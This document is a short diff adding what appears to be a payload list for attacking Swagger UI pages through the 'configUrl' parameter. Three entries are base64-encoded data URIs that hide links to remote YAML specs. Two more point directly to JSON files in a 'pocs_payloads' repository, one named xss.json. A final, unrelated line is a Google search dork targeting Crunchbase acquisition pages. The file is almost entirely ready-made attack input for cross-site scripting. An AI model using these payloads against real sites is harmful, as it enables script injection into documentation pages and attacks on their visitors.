@@ -1,0 +1,8 @@
+?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==
+?configUrl=data:text/html;base64,ew0KInVybCI6Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Db3NtZXNzL3BvY3NfcGF5bG9hZHMvbWFpbi9zd2FnZ2VyLnlhbWwiDQp9
+?configUrl=data:text/html;base64,ew0KInVybCI6Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Db3NtZXNzL3BvY3NfcGF5bG9hZHMvbWFpbi90ZXN0LnlhbWwiDQp9
+
+?configUrl=https://raw.githubusercontent.com/Cosmess/pocs_payloads/main/xss.json
+?configUrl=https://raw.githubusercontent.com/Cosmess/pocs_payloads/main/test.json
+
+site:http://crunchbase.com intext:was acquired by scania
